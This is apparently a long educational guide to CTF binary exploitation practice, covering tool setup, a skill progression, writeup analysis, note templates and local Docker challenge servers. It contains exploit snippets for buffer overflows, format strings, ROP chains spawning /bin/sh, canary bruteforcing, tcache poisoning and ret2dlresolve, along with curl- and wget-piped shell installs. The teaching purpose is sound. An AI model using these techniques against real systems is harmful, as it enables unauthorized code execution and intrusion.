    g++-multilib

# Install pwntools
pip3 install --upgrade pwntools

# Install GDB extensions
# GEF (recommended for beginners)
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Or PEDA
# git clone https://github.com/longld/peda.git ~/peda
# echo "source ~/peda/peda.py" >> ~/.gdbinit

# Or pwndbg
# git clone https://github.com/pwndbg/pwndbg
# cd pwndbg
# ./setup.sh

# Install additional tools
pip3 install ropper ropgadget one_gadget

# Install libc-database for version identification
cd ~/ctf_practice/tools
git clone https://github.com/niklasb/libc-database
cd libc-database
./get ubuntu

echo "[+] Setup complete!"
```

**GDB Configuration for Practice**

```bash
# ~/.gdbinit - Optimized for CTF practice

# Load GEF or pwndbg
source ~/gef/gef.py

# Custom commands for common tasks
define hook-run
    # Clear breakpoints on run
end

define search_rop
    # Quick ROP gadget search
    ropper --file $arg0 --search "$arg1"
end

# Auto-load pwntools helpers
python
import pwn
pwn.context.terminal = ['tmux', 'splitw', '-h']
end

# Display settings for readability
set disassembly-flavor intel
set pagination off

# Save command history
set history save on
set history filename ~/.gdb_history
set history size 10000
```

## Challenge Categories and Difficulty Progression

### Beginner Track (0-3 months)

**Foundations (Weeks 1-4)**

```markdown
**Learning objectives**:
- Understand basic memory layout (stack, heap, data, code segments)
- Read assembly (x86-64 focus initially)
- Use GDB for dynamic analysis
- Write simple pwntools exploits

**Recommended challenges**:

1. **Buffer Overflows (no protections)**
   - pwnable.kr: bof
   - picoCTF: buffer overflow series
   - Practice: Overwriting return address, redirecting control flow
   
   Key concepts:
   - Stack frame layout
   - Return address location
   - Payload crafting with pwntools
   
   Example progression:
   ```python
   # Level 1: Overwrite variable on stack
   payload = b'A' * offset + p32(target_value)
   
   # Level 2: Overwrite return address
   payload = b'A' * offset + p32(win_function_addr)
   
   # Level 3: Pass arguments to function
   payload = b'A' * offset + p32(func_addr) + p32(ret_addr) + p32(arg1)
```

2. **Format String Basics**
    
    - pwnable.kr: passcode
    - nightmare: format string modules
    - Practice: Reading/writing memory with format strings
    
    Progression:
    
    ```python
    # Level 1: Leak stack values
    "%p %p %p %p"
    
    # Level 2: Target specific offset
    "%7$p"  # Read 7th stack value
    
    # Level 3: Write to memory (GOT overwrite)
    payload = p32(got_addr) + b'%10$n'
    ```
    
3. **Simple Logic Bugs**
    
    - pwnable.kr: collision, mistake
    - Practice: Integer overflows, off-by-one errors
    
    Focus areas:
    
    - Input validation failures
    - Integer wrapping behavior
    - Boundary condition exploitation

````

**Assessment checkpoint**:
```markdown
You're ready to progress when you can:
- [ ] Craft buffer overflow exploits without looking at examples
- [ ] Use GDB to find offset to return address
- [ ] Write format string exploit to leak stack values
- [ ] Understand stack frame layout from disassembly
- [ ] Solve 5+ beginner challenges independently
````

### Intermediate Track (3-6 months)

**Memory Protections and Bypasses**

```markdown
**Learning objectives**:
- Defeat NX with ROP
- Bypass ASLR via information leaks
- Understand PIE and calculate base addresses
- Defeat stack canaries

**Challenge sequence**:

1. **Return-Oriented Programming (ROP)**
   - ROP Emporium: ret2win through callme
   - pwnable.tw: start, orw
   
   Skill development:
   ```python
   # Week 1: Simple ret2libc
   payload = flat(
       b'A' * offset,
       rop.find_gadget(['pop rdi', 'ret'])[0],
       next(elf.search(b'/bin/sh\x00')),
       elf.plt['system']
   )
   
   # Week 2: Multiple function calls
   rop = ROP(elf)
   rop.call('func1', [arg1, arg2])
   rop.call('func2', [arg3])
   payload = fit({offset: rop.chain()})
   
   # Week 3: Writing data with ROP
   # write4 challenge style
   
   # Week 4: Complex ROP chains
   # ret2csu, stack pivoting
```

2. **Information Leak Exploitation**
    
    - pwnable.tw: dubblesort
    - pwnable.xyz: format string challenges
    
    Two-stage exploit pattern:
    
    ```python
    # Stage 1: Leak
    def leak_libc():
        p.sendline(leak_payload)
        leak = u64(p.recv(8))
        return leak - offset
    
    # Stage 2: Exploit
    def exploit(libc_base):
        system = libc_base + libc.symbols['system']
        binsh = libc_base + next(libc.search(b'/bin/sh'))
        # Build ROP chain with known addresses
    
    libc_base = leak_libc()
    exploit(libc_base)
    ```
    
3. **Heap Exploitation Basics**
    
    - how2heap: fastbin_dup, unsafe_unlink
    - pwnable.tw: hacknote
    
    Concepts to master:
    
    - Heap chunk structure
    - Malloc/free internals
    - Use-After-Free exploitation
    - Basic heap overflow
    
    Practice progression:
    
    ```markdown
    Week 1: Understand heap layout with GDB
    Week 2: UAF to leak libc addresses
    Week 3: UAF to hijack function pointers
    Week 4: Fastbin attack for arbitrary write
    ```
    
4. **Canary Bypasses**
    
    - Practice leaking canaries via format strings
    - Fork-based bruteforce attacks
    
    Techniques:
    
    ```python
    # Method 1: Format string leak
    canary = leak_format_string(offset=17)  # Typical canary offset
    
    # Method 2: Byte-by-byte bruteforce (fork-based servers)
    def bruteforce_canary():
        canary = b'\x00'
        for i in range(1, 8):
            for byte in range(256):
                if try_value(canary + bytes([byte])):
                    canary += bytes([byte])
                    break
        return canary
    ```
    

````

**Intermediate assessment**:
```markdown
Progress checkpoint:
- [ ] Build ROP chains using pwntools ROP object
- [ ] Leak and calculate libc base address
- [ ] Defeat stack canaries via leak or bruteforce
- [ ] Exploit basic UAF vulnerability
- [ ] Solve ROP Emporium through challenge 6
- [ ] Solve 3+ intermediate pwnable.tw challenges
````

### Advanced Track (6-12 months)

**Modern Heap Exploitation**

```markdown
**Focus areas**:
- Tcache poisoning (glibc 2.26+)
- Unsorted bin attack
- House of techniques (House of Force, House of Spirit, etc.)
- Arbitrary write to arbitrary code execution

**Recommended resources**:

1. **how2heap Repository**
   ```bash
   git clone https://github.com/shellphish/how2heap
   cd how2heap
   
   # Progression through techniques:
   # 1. first_fit
   # 2. fastbin_dup
   # 3. unsafe_unlink
   # 4. house_of_spirit
   # 5. poison_null_byte
   # 6. house_of_lore
   # 7. house_of_force
   # 8. unsorted_bin_attack
   # 9. large_bin_attack
   # 10. tcache_poisoning (glibc 2.26+)
```

Study methodology:

- Read source code to understand technique
- Compile and run with different glibc versions
- Modify to exploit variations
- Apply to similar CTF challenges

2. **Heap Exploitation CTF Challenges**
    
    - pwnable.tw: hacknote, seethefile, kidding
    - pwnable.kr: uaf, note
    
    Challenge approach:
    
    ```python
    # Standard heap exploitation pattern
    
    # 1. Primitive identification
    # - What can we control? (size, data, free order)
    # - What corruption is possible?
    
    # 2. Information leak
    def leak_heap_base():
        # UAF or heap overflow to leak heap metadata
        pass
    
    def leak_libc_base():
        # Large chunk free → unsorted bin leak
        pass
    
    # 3. Arbitrary write primitive construction
    def arbitrary_write(where, what):
        # Tcache poisoning, fastbin attack, etc.
        pass
    
    # 4. Control flow hijack
    # Typical targets: __free_hook, __malloc_hook, vtable
    ```
    
3. **Advanced ROP Techniques**
    
    - ret2dlresolve (x86)
    - SROP (Sigreturn-Oriented Programming)
    - JOP (Jump-Oriented Programming)
    
    **ret2dlresolve practice**:
    
    ```python
    # When no libc leaks possible and only a few ROP gadgets
    from pwn import *
    
    elf = ELF('./binary')
    rop = ROP(elf)
    
    # Build fake link_map and symbol resolution structures
    dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
    
    rop.raw(b'A' * offset)
    rop.read(0, dlresolve.data_addr)  # Write fake structures
    rop.ret2dlresolve(dlresolve)
    
    payload = rop.chain()
    ```
    
4. **Kernel Exploitation Introduction**
    
    - pawnyable.cafe (Japanese, but code-focused)
    - Linux Kernel Module challenges
    
    New concepts:
    
    - Kernel address space vs userspace
    - Privilege escalation via kernel bugs
    - Defeating SMEP/SMAP
    - Kernel ROP chains

````

**Advanced assessment**:
```markdown
Mastery indicators:
- [ ] Exploit tcache poisoning for arbitrary write
- [ ] Use unsorted bin attack for libc leak
- [ ] Construct ret2dlresolve payload from scratch
- [ ] Solve advanced pwnable.tw challenges (3+ solves)
- [ ] Understand and apply House of techniques
- [ ] Begin kernel exploitation (basic LKM challenges)
````

### Expert Track (12+ months)

**Cutting-Edge Techniques**

```markdown
**Research-level exploitation**:

1. **Modern heap protections**
   - Safe-linking bypass (glibc 2.32+)
   - Tcache key validation
   - House of IO (FILE structure exploitation)
   
2. **Advanced information leak**
   - Blind ROP (BROP)
   - Side-channel attacks (cache timing)
   - Partial overwrite techniques
   
3. **Kernel and hypervisor exploitation**
   - CVE research and exploitation
   - Escape from containers/VMs
   - Browser exploitation basics
   
4. **Automated exploit generation**
   - Angr symbolic execution
   - AFL++ fuzzing integration
   - Custom tooling development
```

### Difficulty Recognition Patterns

**Challenge difficulty indicators**:

```markdown
**Easy (100-200 points)**:
- Source code provided
- Single, obvious vulnerability
- Minimal or no protections
- Direct exploitation path
- Time: 15-45 minutes

Typical patterns:
- Buffer overflow with win() function
- Format string with simple GOT overwrite
- Logic bug with clear abuse path

**Medium (300-400 points)**:
- No source (binary-only analysis required)
- Modern protections (NX, PIE, Partial RELRO)
- Requires information leak
- 2-stage exploitation
- Time: 45-90 minutes

Typical patterns:
- Leak + ROP chain
- Heap UAF with libc leak → __free_hook
- Format string → canary leak + ROP

**Hard (500-700 points)**:
- Full protections (NX, PIE, Full RELRO, Canary)
- Complex vulnerability (requires deep understanding)
- Multiple exploitation stages
- Limited primitives
- Time: 90-180 minutes

Typical patterns:
- Heap exploitation with modern glibc
- Advanced ROP (ret2csu, ret2dlresolve)
- Kernel exploitation
- Custom protection bypasses

**Expert (800-1000 points)**:
- Research-level techniques
- Novel protection bypass required
- Minimal solve count (<10 teams)
- May require vulnerability discovery
- Time: 180+ minutes or multiple sessions

Typical patterns:
- 0-day exploitation
- Hypervisor escape
- Complex heap feng shui
- Browser exploitation
```

## Writeup Analysis Techniques

### Effective Writeup Reading Strategy

**Pre-Analysis Phase**

```markdown
Before reading a writeup, attempt the challenge yourself:

1. **Time-box your attempt** (60-90 minutes)
   - Forces active problem-solving
   - Builds intuition for vulnerability patterns
   - Makes writeup learning more effective

2. **Document your approach**
   ```markdown
   ## My Attempt - [Challenge Name]
   
   **Initial observations**:
   - Checksec: NX, PIE, Partial RELRO, No Canary
   - Vulnerability hypothesis: Buffer overflow in read_input()
   
   **Approaches tried**:
   1. Direct ret2win: Failed (PIE randomization)
   2. Format string leak: No format string found
   3. ???
   
   **Blockers**:
   - Can't find information leak primitive
   - Stuck at [specific technical problem]
```

3. **Now read writeup strategically**
    - Don't read linearly; scan for your blocker first
    - Compare author's approach to yours
    - Identify what you missed and why

````

**Active Reading Methodology**
```markdown
## Three-Pass Writeup Analysis

**Pass 1: High-level understanding** (5 minutes)
- Skim for exploitation overview
- Identify key techniques used
- Note tools/methods you're unfamiliar with

Questions to answer:
- What category of vulnerability?
- What protection bypasses were needed?
- What was the final exploitation primitive?

**Pass 2: Technical deep-dive** (20 minutes)
- Read code line-by-line
- Understand each payload component
- Verify calculations (offsets, addresses)

For each code block:
```python
# Author's code
payload = b'A' * 264 + p64(leak - 0x29d90)

# Your annotations
# 264 = offset to saved RIP (found how? → GDB pattern_offset)
# leak - 0x29d90 = calculate PIE base (0x29d90 = main offset in binary)
# Why this specific offset? → Check in Ghidra
````

**Pass 3: Reproduction and experimentation** (30-60 minutes)

- Rewrite exploit from scratch (no copy-paste)
- Test modifications:
    - What if we use different ROP gadgets?
    - Can we leak from alternative location?
    - What breaks the exploit?

Document learnings:

```markdown
## Insights from [Author's] Writeup

**What I missed**:
- The format string wasn't in obvious place (hidden in error message)
- Didn't realize UAF persists across multiple operations
- Overlooked partial overwrite possibility (assumed needed full address)

**New techniques learned**:
- Using pwntools `fmtstr_payload()` for automated format string exploit
- Tcache key validation bypass (XOR with heap address)
- Alternative to __free_hook: _IO_FILE vtable hijacking

**Reusable patterns**:
- Information leak template [saved to ~/templates/leak_pattern.py]
- Heap grooming for reliable primitive [documented in notes]
```

````

### Comparative Analysis Across Multiple Writeups

**Multi-Writeup Learning**
```markdown
For important challenges, read 2-3 different writeups:

**What to compare**:

1. **Approach diversity**
   ```markdown
   Challenge: heap_challenge
   
   | Author | Technique | Complexity | Success Rate |
   |--------|-----------|------------|--------------|
   | Author A | Tcache poisoning | Medium | 100% |
   | Author B | Fastbin attack | High | ~60% |
   | Author C | Unsorted bin + House of Force | Very High | 100% |
   
   **Analysis**: Author A's approach is optimal (simpler, reliable)
   **Learning**: Tcache is often easier than older fastbin techniques
````

2. **Code quality and style**
    
    - Which writeup has cleanest exploit code?
    - Best commented/documented?
    - Most automated vs manual?
3. **Explanation depth**
    
    - Who explains "why" vs just "what"?
    - Best for learning: deeper explanations
    - Best for speed: quick reference writeups
4. **Alternative techniques mentioned**
    
    ```markdown
    Author A: "I used tcache poisoning, but fastbin would also work"
    → Research both techniques, understand tradeoffs
    
    Author B: "Alternative: heap overflow to corrupt chunk size"
    → Document alternative approach for future challenges
    ```
    

````

### Extracting Reusable Patterns

**Building Personal Template Library**
```python
# After analyzing 5-10 similar writeups, extract patterns

# ~/templates/heap_uaf_template.py
"""
UAF exploitation template
Based on: [challenge1], [challenge2], [challenge3]
Pattern recognized across multiple CTF challenges
"""

from pwn import *

class HeapUAF:
    """Reusable UAF exploitation framework"""
    
    def __init__(self, p, alloc_func, free_func, edit_func, read_func):
        self.p = p
        self.alloc = alloc_func
        self.free = free_func
        self.edit = edit_func
        self.read = read_func
        self.chunks = {}
    
    def leak_libc_via_uaf(self, size=0x100):
        """
        Standard pattern: allocate large chunk, free it,
        read back to leak unsorted bin fd pointer
        """
        idx = self.alloc(size)
        self.free(idx)
        leak = self.read(idx)
        # main_arena offset varies by glibc version
        return u64(leak[:8]) - MAIN_ARENA_OFFSET
    
    def arbitrary_write_via_tcache(self, target_addr, value):
        """
        Tcache poisoning pattern for arbitrary write
        """
        # Allocate two chunks
        a = self.alloc(0x80)
        b = self.alloc(0x80)
        
        # Free both (enter tcache)
        self.free(a)
        self.free(b)
        
        # UAF edit chunk b's fd to target
        self.edit(b, p64(target_addr))
        
        # Allocate twice: second returns target_addr
        self.alloc(0x80)
        target_chunk = self.alloc(0x80)
        
        # Write value to target
        self.edit(target_chunk, value)

# Usage in new challenges:
# uaf = HeapUAF(p, alloc_note, delete_note, edit_note, show_note)
# libc_base = uaf.leak_libc_via_uaf()
# uaf.arbitrary_write_via_tcache(elf.got['free'], system_addr)
````

**Pattern Recognition Database**

````markdown
# ~/ctf_notes/exploitation_patterns.md

## Information Leak Patterns

### Pattern: Format String Stack Leak
**When applicable**: printf(user_input), no sanitization
**Typical offsets**: 
- Canary: offset 13-17 (x64)
- Libc return address: offset 15-25 (x64)
- PIE code pointer: offset 9-15 (x64)

**Seen in challenges**:
- pwnable.tw: dubblesort (offset 15 for libc)
- HTB: format (offset 13 for canary)
- picoCTF: format_string_3 (offset 20 for PIE)

**Code template**:
```python
# Find offset with automated fuzzing
for i in range(1, 50):
    p = process('./binary')
    p.sendline(f'%{i}$p'.encode())
    result = p.recvline()
    if b'0x7f' in result:  # Possible libc address
        print(f"Potential libc leak at offset {i}")
````

### Pattern: Unsorted Bin Libc Leak

**When applicable**: UAF or heap overflow with ability to read freed chunk **Requirements**:

- Chunk size > 0x408 (tcache max)
- Chunk gets placed in unsorted bin
- Can read after free

**Calculation**:

```python
leak = u64(read_freed_chunk()[:8])
libc_base = leak - main_arena_offset
# main_arena offset: 0x1ebbe0 (glibc 2.31), varies by version
```

**Seen in challenges**:

- pwnable.tw: hacknote
- pwnable.kr: note
- H ackTheBox: rope2

[Continue documenting patterns as you encounter them]

````

### Critical Analysis Skills

**Identifying Writeup Quality**
```markdown
## Good Writeup Indicators:
- ✓ Explains "why" not just "what"
- ✓ Shows failed attempts and lessons learned
- ✓ Provides debugging methodology
- ✓ Includes commented exploit code
- ✓ References learning resources
- ✓ Discusses alternative approaches

## Poor Writeup Indicators:
- ✗ Just dumps exploit code with no explanation
- ✗ Skips key insights ("and then I calculated the offset")
- ✗ No mention of tooling or debugging process
- ✗ Uncommented, complex code
- ✗ Assumes reader knows advanced concepts without explanation

## When writeup is unclear:
1. Check author's GitHub for more detailed version
2. Search for video walkthrough of same challenge
3. Ask in CTF Discord/Reddit with specific questions
4. Combine insights from multiple writeups
````

**Verification and Validation**

```bash
# Always test writeup exploits yourself

# 1. Set up matching environment git clone [writeup_repo] cd [challenge_directory]

# 2. Verify provided files match

sha256sum binary libc.so.6

# Compare with writeup's checksums

# 3. Test exploit as-is

python3 exploit.py local

# 4. Verify calculations manually

# Example: Check offset calculation

gdb ./binary gef➤ pattern create 300 gef➤ run

# [paste pattern]

gef➤ pattern offset $rsp

# Compare with writeup's stated offset

# 5. Test each stage independently

python3 -c "from exploit import *; test_leak_stage()" python3 -c "from exploit import *; test_exploit_stage()"

# 6. Modify and break intentionally

# Change offset by +8: does it fail as expected?

# Use wrong libc version: does behavior change?

# Understanding failure modes teaches as much as success
````

**Extracting Debugging Methodology**
```markdown
## Learning from Writeup Debugging Process

Good writeups show the debugging journey:

**Example from quality writeup**:
> "My initial ROP chain crashed. Using GDB, I found that the stack 
> was misaligned (RSP ended in 0x8 instead of 0x0). Adding a single 
> 'ret' gadget before system() fixed the alignment issue."

**What to extract**:
1. **Problem identification method**: "Using GDB, I found..."
   - Replicate their debugging process
   - Learn their investigation technique

2. **Solution pattern**: "Adding a single ret gadget..."
   - This is a reusable pattern for stack alignment
   - Document for future exploits

3. **Root cause understanding**: "RSP ended in 0x8..."
   - Research WHY this matters (movaps instruction requires 16-byte alignment)
   - Deeper understanding prevents similar issues

**Your notes**:
```markdown
## Debugging Pattern: Stack Alignment Crashes

**Symptom**: Exploit crashes inside libc function (system, execve, etc.)
**Cause**: x64 ABI requires 16-byte stack alignment before call
**Diagnosis**: Check RSP in GDB before crash
  gef➤ x/gx $rsp  # Should end in 0x...0, not 0x...8

**Solution**: Add extra 'ret' gadget before function call
**Prevention**: Always check alignment when calling libc functions

**Seen in**:
- [Writeup 1]: system() call in ROP chain
- [Writeup 2]: one_gadget failure
- My exploit: challenge_xyz (2025-10-15)
````

````

### Building a Personal Knowledge Base

**Structured Note-Taking System**
```bash
# Organize learnings by category
~/ctf_knowledge/
├── techniques/
│   ├── format_string/
│   │   ├── basics.md
│   │   ├── advanced_attacks.md
│   │   └── examples/
│   ├── rop/
│   │   ├── ret2libc.md
│   │   ├── ret2csu.md
│   │   └── gadget_hunting.md
│   └── heap/
│       ├── tcache_poisoning.md
│       ├── uaf_exploitation.md
│       └── house_of_techniques.md
├── challenges/
│   ├── pwnable_tw/
│   │   ├── start_writeup_analysis.md
│   │   ├── dubblesort_comparison.md
│   │   └── hacknote_detailed.md
│   └── pwnable_kr/
├── patterns/
│   ├── information_leaks.md
│   ├── heap_primitives.md
│   └── protection_bypasses.md
└── tools/
    ├── pwntools_recipes.md
    ├── gdb_commands.md
    └── automation_scripts/
````

**Writeup Analysis Template**

````markdown
# Writeup Analysis: [Challenge Name]

**Source**: [Author/Blog/CTF]
**Date**: 2025-10-19
**Challenge Link**: [URL if available]
**My Attempt Time**: 90 minutes (failed at leak stage)

## Challenge Summary
- Binary: [name], protections: [NX/PIE/RELRO/Canary]
- Vulnerability: [type]
- Exploitation: [high-level approach]

## Key Techniques Used
1. [Technique 1]: [Brief description]
2. [Technique 2]: [Brief description]

## Detailed Analysis

### Stage 1: [e.g., Information Leak]
**Author's approach**:
[Explain what they did]

**Why this works**:
[Your understanding of underlying mechanism]

**Code breakdown**:
```python
# Author's code with your annotations
payload = b'%15$p'  
# Why offset 15? → Tested with fuzzing script
# What does it leak? → __libc_start_main+231 from stack
````

**Alternative approaches**:

### Stage 2: [e.g., Exploitation]

[Continue same structure]

## What I Learned

### New Concepts

- [Concept 1]: [Explanation in your own words]
- [Concept 2]: [Where to learn more]

### Techniques to Practice

- [ ] Reproduce this exploit from scratch
- [ ] Apply technique to similar challenge [challenge_name]
- [ ] Create template for this pattern

### Mistakes I Made

- **Mistake**: [What you did wrong]
    - **Why it failed**: [Technical reason]
    - **Lesson**: [How to avoid in future]

## Reusable Components

- Saved to: `~/templates/[filename].py`
- Pattern documented in: `~/patterns/[category].md`

## Related Challenges

- Similar vulnerability: [challenge1], [challenge2]
- Same technique: [challenge3], [challenge4]

## Questions/Further Research

- [ ] Why does tcache key validation work this way?
- [ ] How does this differ in glibc 2.35?
- [ ] Research: [topic to explore deeper]

````

### Video Walkthrough Analysis

**Learning from Video Writeups**
```markdown
## Video Walkthrough Strategy

**Advantages of video writeups**:
- See real-time debugging process
- Observe workflow and tool usage
- Catch subtle details in terminal output
- Watch thought process unfold

**Active viewing technique**:

**Before watching** (10 min):
- Attempt challenge yourself
- Write down specific questions
- Prepare test environment to follow along

**During watching**:
- **Pause frequently** (every 3-5 minutes)
  - Replicate what they just did
  - Take notes on commands/approaches
  - Try slight variations

- **Track timestamps** for key moments:
  ```markdown
  3:45 - Found vulnerability with Ghidra
  8:20 - Calculated offset with pattern_create
  12:30 - Built information leak payload
  18:15 - Discovered stack alignment issue
  22:00 - Final exploit successful
````

- **Note tool usage**:
    - GDB commands they use (add to your cheatsheet)
    - pwntools functions you didn't know
    - Workflow optimizations (keyboard shortcuts, scripts)

**After watching**:

- Reproduce exploit without video (test retention)
- Try alternative approaches mentioned
- Research concepts you didn't understand

**Best video channels for writeups**:

- John Hammond (beginner-friendly, detailed)
- LiveOverflow (advanced, educational focus)
- IppSec (HTB focus, thorough methodology)
- GynvaelEN (expert-level, research-oriented)

````

## Building Local Test Environments

### Docker-Based Challenge Environment

**Standardized Docker Setup**
```dockerfile
# Dockerfile for CTF practice environment
FROM ubuntu:22.04

# Prevent interactive prompts during installation
ENV DEBIAN_FRONTEND=noninteractive

# Install essential packages
RUN apt-get update && apt-get install -y \
    build-essential \
    gdb \
    gdbserver \
    python3 \
    python3-pip \
    python3-dev \
    git \
    vim \
    tmux \
    wget \
    curl \
    netcat \
    socat \
    file \
    strace \
    ltrace \
    binutils \
    gcc-multilib \
    g++-multilib \
    libc6-dbg \
    libc6-dbg:i386 \
    && rm -rf /var/lib/apt/lists/*

# Install pwntools and related Python packages
RUN pip3 install --no-cache-dir \
    pwntools \
    ropper \
    capstone \
    keystone-engine \
    unicorn \
    ropgadget

# Install GEF for GDB
RUN wget -q https://gef.blah.cat/sh -O- | sh

# Create working directory
WORKDIR /ctf

# Add non-root user for safer challenge testing
RUN useradd -m -s /bin/bash ctf && \
    echo "ctf:ctf" | chpasswd

# Switch to ctf user
USER ctf

# Set up home directory structure
RUN mkdir -p /home/ctf/{challenges,tools,notes}

CMD ["/bin/bash"]
````

**Build and usage**:

```bash
# Build the image
docker build -t ctf-practice:latest .

# Run container with challenge files
docker run -it --rm \
    -v $(pwd):/ctf/current_challenge \
    --cap-add=SYS_PTRACE \
    --security-opt seccomp=unconfined \
    ctf-practice:latest

# For specific libc versions
docker run -it --rm \
    -v $(pwd):/ctf \
    -v /path/to/libc-2.31.so:/lib/x86_64-linux-gnu/libc.so.6 \
    ctf-practice:latest
```

**Multiple libc version management**:

```bash
# Create environment for each common libc version
mkdir -p ~/ctf_docker/libc-versions

# Download various libc versions
cd ~/ctf_docker/libc-versions
wget https://libc.rip/download/libc6_2.27-3ubuntu1_amd64.so
wget https://libc.rip/download/libc6_2.31-0ubuntu9_amd64.so
wget https://libc.rip/download/libc6_2.35-0ubuntu3_amd64.so

# Create version-specific Dockerfiles
cat > Dockerfile.libc-2.27 << 'EOF'
FROM ubuntu:18.04
# [install packages as above]
# This Ubuntu version ships with libc 2.27
EOF

cat > Dockerfile.libc-2.31 << 'EOF'
FROM ubuntu:20.04
# libc 2.31
EOF

cat > Dockerfile.libc-2.35 << 'EOF'
FROM ubuntu:22.04
# libc 2.35
EOF

# Build each version
docker build -f Dockerfile.libc-2.27 -t ctf-env:libc-2.27 .
docker build -f Dockerfile.libc-2.31 -t ctf-env:libc-2.31 .
docker build -f Dockerfile.libc-2.35 -t ctf-env:libc-2.35 .
```

### Local Challenge Server Setup

**Socat-Based Service Emulation**

```bash
#!/bin/bash
# run_challenge_server.sh - Emulate remote CTF challenge server

BINARY="./challenge"
PORT=1337
TIMEOUT=60

echo "[*] Starting challenge server on port $PORT"

# Method 1: Simple socat wrapper
socat TCP-LISTEN:$PORT,reuseaddr,fork EXEC:"$BINARY"

# Method 2: With timeout (prevents resource exhaustion)
socat TCP-LISTEN:$PORT,reuseaddr,fork \
    EXEC:"timeout $TIMEOUT $BINARY",pty,stderr,setsid,sigint,sane

# Method 3: Isolated per-connection (requires docker)
socat TCP-LISTEN:$PORT,reuseaddr,fork \
    EXEC:"docker run --rm -i ctf-env:libc-2.31 /ctf/challenge"
```

**xinetd Configuration** (more realistic CTF setup):

```bash
# Install xinetd
sudo apt-get install xinetd

# Create challenge service configuration
sudo tee /etc/xinetd.d/ctf_challenge << EOF
service ctf_challenge
{
    disable = no
    socket_type = stream
    protocol = tcp
    wait = no
    user = ctf
    bind = 127.0.0.1
    server = /home/ctf/challenges/challenge_wrapper.sh
    port = 1337
    per_source = 5
    rlimit_cpu = 20
    rlimit_as = 100M
}
EOF

# Create wrapper script
cat > /home/ctf/challenges/challenge_wrapper.sh << 'EOF'
#!/bin/bash
cd /home/ctf/challenges
timeout 60 ./challenge
EOF

chmod +x /home/ctf/challenges/challenge_wrapper.sh

# Start service
sudo systemctl restart xinetd

# Test connection
nc localhost 1337
```

**Resource-Limited Testing**

```bash
# Simulate resource-constrained remote environment
ulimit -t 30      # CPU time limit: 30 seconds
ulimit -v 102400  # Virtual memory: 100MB
ulimit -n 50      # Max open files: 50

./challenge
```

### Matching Remote Environment

**Environment Fingerprinting**

```python
#!/usr/bin/env python3
"""Fingerprint remote challenge environment"""
from pwn import *

def fingerprint_remote(host, port):
    """Gather information about remote environment"""
    
    p = remote(host, port)
    
    info = {
        'os': None,
        'arch': None,
        'libc_version': None,
        'protections': {},
    }
    
    # Try to leak system information
    # Method 1: Check error messages for version info
    p.sendline(b'\x00' * 1000)  # Trigger potential error
    response = p.recvall(timeout=2)
    
    # Look for version strings in errors
    if b'glibc' in response.lower():
        # Parse glibc version from error
        pass
    
    # Method 2: Leak libc pointer and identify version
    # [Use your information leak exploit here]
    
    # Method 3: Check behavior differences
    # - Test for tcache (glibc >= 2.26)
    # - Test for safe-linking (glibc >= 2.32)
    
    p.close()
    
    return info

# Usage
info = fingerprint_remote('chall.pwnable.tw', 10000)
log.info(f"Remote environment: {info}")
```

**Libc Version Identification**

```bash
# Method 1: Use libc-database
cd ~/tools/libc-database

# From leaked addresses
./find puts 0x7f1234567890 system 0x7f1234abcdef

# Or from binary
./identify /path/to/remote_libc.so

# Method 2: Use libc.rip API
curl -X POST https://libc.rip/api/find \
    -d '{"symbols": {"puts": "0x809c0", "system": "0x4f440"}}'

# Method 3: Manual comparison
readelf -s libc.so.6 | grep -E " (puts|system|malloc)@@"
# Compare offsets with leaked values
```

**Patching Binary for Local Testing**

```bash
# Use patchelf to match remote environment

# Set interpreter
patchelf --set-interpreter ./ld-2.31.so ./challenge

# Set rpath (where to find libc)
patchelf --set-rpath '.' ./challenge

# Verify
ldd ./challenge
# Should show:
#   libc.so.6 => ./libc-2.31.so
#   /lib64/ld-linux-x86-64.so.2 => ./ld-2.31.so

# Test
./challenge  # Now runs with provided libc
```

**Using pwntools context for environment matching**:

```python
from pwn import *

# Configure for exact remote environment match
context.arch = 'amd64'
context.os = 'linux'
context.bits = 64
context.endian = 'little'

# Load remote libc
libc = ELF('./libc-2.31.so')

# Patch binary to use this libc
elf = ELF('./challenge')
elf.libc = libc

# Now offsets/gadgets will match remote environment
```

### Debugging Infrastructure

**GDB Server for Remote Debugging**

```bash
# On server (or Docker container)
gdbserver 0.0.0.0:1234 ./challenge

# On client
gdb ./challenge
(gdb) target remote localhost:1234
(gdb) continue

# Automated with pwntools
p = remote('localhost', 1337)
gdb.attach(p, '''
    break *main+100
    continue
''')
```

**Split-Terminal Debugging Setup**

```bash
# tmux configuration for CTF debugging
cat > ~/.tmux.conf.ctf << 'EOF'
# Split layout for CTF
bind-key C-c split-window -h -p 40 \; \
    split-window -v -p 50 \; \
    select-pane -t 0

# Layout:
# +-------------------+----------+
# |                   |  GDB     |
# |   Exploit         |          |
# |   Development     +----------+
# |                   |  Notes   |
# +-------------------+----------+

# Quick access to panes
bind-key 1 select-pane -t 0  # Exploit
bind-key 2 select-pane -t 1  # GDB
bind-key 3 select-pane -t 2  # Notes

# Pane titles
set -g pane-border-status top
set -g pane-border-format "#T"
EOF

# Usage
tmux -f ~/.tmux.conf.ctf new-session -s ctf
```

**Automated Testing Framework**

```python
#!/usr/bin/env python3
"""Automated exploit testing framework"""

import sys
from pwn import *

class ExploitTester:
    def __init__(self, binary, exploit_func):
        self.binary = binary
        self.exploit_func = exploit_func
        self.results = []
    
    def test_local(self, iterations=10):
        """Test exploit reliability locally"""
        log.info(f"Testing locally ({iterations} iterations)...")
        
        successes = 0
        for i in range(iterations):
            try:
                p = process(self.binary)
                result = self.exploit_func(p)
                
                if self._check_success(result):
                    successes += 1
                    log.success(f"Iteration {i+1}: Success")
                else:
                    log.failure(f"Iteration {i+1}: Failed")
                
                p.close()
                
            except Exception as e:
                log.error(f"Iteration {i+1}: Exception - {e}")
        
        success_rate = (successes / iterations) * 100
        log.info(f"Local success rate: {success_rate:.1f}%")
        
        return success_rate
    
    def test_remote(self, host, port, iterations=5):
        """Test against remote target"""
        log.info(f"Testing remote {host}:{port} ({iterations} iterations)...")
        
        successes = 0
        for i in range(iterations):
            try:
                p = remote(host, port)
                result = self.exploit_func(p)
                
                if self._check_success(result):
                    successes += 1
                    log.success(f"Iteration {i+1}: Success")
                    # Save flag if captured
                    if b'flag{' in result or b'FLAG{' in result:
                        self._save_flag(result)
                else:
                    log.failure(f"Iteration {i+1}: Failed")
                
                p.close()
                
            except Exception as e:
                log.error(f"Iteration {i+1}: Exception - {e}")
        
        success_rate = (successes / iterations) * 100
